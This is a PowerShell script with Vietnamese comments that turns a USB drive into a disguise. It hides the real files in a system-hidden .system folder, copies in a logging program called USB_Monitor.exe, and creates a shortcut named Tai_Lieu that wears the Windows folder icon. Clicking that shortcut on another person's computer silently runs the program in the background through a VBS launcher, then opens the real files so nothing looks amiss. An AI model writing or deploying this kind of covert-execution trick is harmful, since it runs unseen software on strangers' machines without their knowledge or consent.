<#
==============================================================================
SCRIPT THIẾT LẬP THƯ MỤC NGỤY TRANG CHO MỌI LOẠI USB (TRƯỜNG HỢP 2)
Tạo cấu trúc thư mục tàng hình trên USB để chạy trên máy lạ khi click vào
==============================================================================
#>

param(
    [string]$UsbDriveLetter = "E"
)

$DrivePath = "$($UsbDriveLetter.TrimEnd(':')):"
if (-not (Test-Path $DrivePath)) {
    Write-Host "[X] Khong tim thay o dia $DrivePath. Vui long kiem tra lai ky tu o USB!" -ForegroundColor Red
    return
}

Write-Host "Dang thiet lap cau truc ngu trang tren o dia $DrivePath..." -ForegroundColor Cyan

# 1. Tạo các thư mục cấu trúc
$SystemDir = Join-Path $DrivePath ".system"
$RealDataDir = Join-Path $SystemDir "Real_Data"
$LogsDir = Join-Path $SystemDir "USB_Logs"
$DataDir = Join-Path $SystemDir ".usb_data"

New-Item -ItemType Directory -Path $SystemDir -Force | Out-Null
New-Item -ItemType Directory -Path $RealDataDir -Force | Out-Null
New-Item -ItemType Directory -Path $LogsDir -Force | Out-Null
New-Item -ItemType Directory -Path $DataDir -Force | Out-Null

# 2. Khởi tạo file state.json lưu số lần cắm
$StateFile = Join-Path $DataDir "state.json"
if (-not (Test-Path $StateFile)) {
    $InitialState = @{
        device_name = "USB_Flash_Drive"
        total_plug_count = 0
        first_initialized = (Get-Date -Format "yyyy/MM/dd HH:mm:ss")
        history = @()
    }
    $InitialState | ConvertTo-Json -Depth 5 | Set-Content -Path $StateFile -Encoding UTF8
}

# 2.1 Sao chép file thực thi USB_Monitor.exe nếu có
$LocalExe = Join-Path $PSScriptRoot "USB_Monitor.exe"
$DistExe = Join-Path (Join-Path $PSScriptRoot "dist") "USB_Monitor.exe"
if (Test-Path $LocalExe) {
    Copy-Item $LocalExe -Destination (Join-Path $SystemDir "USB_Monitor.exe") -Force
    Write-Host "[+] Da chep USB_Monitor.exe vao .system tren USB." -ForegroundColor Green
} elseif (Test-Path $DistExe) {
    Copy-Item $DistExe -Destination (Join-Path $SystemDir "USB_Monitor.exe") -Force
    Write-Host "[+] Da chep USB_Monitor.exe tu dist vao .system tren USB." -ForegroundColor Green
}

# 3. Tạo file launcher.vbs tàng hình
$VbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
currentDir = fso.GetParentFolderName(WScript.ScriptFullName)

' 1. Chay phan mem ghi log o che do ngam
If fso.FileExists(currentDir & "\USB_Monitor.exe") Then
    WshShell.Run Chr(34) & currentDir & "\USB_Monitor.exe" & Chr(34), 0, False
ElseIf fso.FileExists(currentDir & "\usb_monitor.py") Then
    WshShell.Run "python " & Chr(34) & currentDir & "\usb_monitor.py" & Chr(34), 0, False
End If

' 2. Mo thu muc du lieu that de nguoi dung xem binh thuong
WshShell.Run "explorer.exe " & Chr(34) & currentDir & "\Real_Data" & Chr(34), 1, False
"@
Set-Content -Path (Join-Path $SystemDir "launcher.vbs") -Value $VbsContent -Encoding UTF8

# 4. Tạo Shortcut ngụy trang "Tai_Lieu.lnk" ở thư mục gốc USB
$WshShell = New-Object -ComObject WScript.Shell
$ShortcutPath = Join-Path $DrivePath "Tai_Lieu.lnk"
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = "wscript.exe"
$Shortcut.Arguments = """$DrivePath\.system\launcher.vbs"""
$Shortcut.WorkingDirectory = "$DrivePath\.system"
$Shortcut.IconLocation = "%SystemRoot%\System32\shell32.dll,3" # Icon Thư mục vàng Windows
$Shortcut.Description = "Thư mục tài liệu"
$Shortcut.Save()

# 5. Đặt thuộc tính ẩn hệ thống (attrib +s +h) cho thư mục .system
cmd /c "attrib +s +h +r `"$SystemDir`""

Write-Host "==========================================================" -ForegroundColor Green
Write-Host "         THIẾT LẬP THÀNH CÔNG CHO Ổ ĐĨA USB!              " -ForegroundColor Yellow
Write-Host "==========================================================" -ForegroundColor Green
Write-Host "- Thư mục .system đã được ẩn bảo vệ tuyệt đối." -ForegroundColor White
Write-Host "- Khi cắm vào máy lạ, người dùng chỉ thấy 'Tai_Lieu' với Icon thư mục." -ForegroundColor White
Write-Host "- Khi bấm mở, phần mềm ghi log sẽ tự chạy ngầm và mở Real_Data ra!" -ForegroundColor White
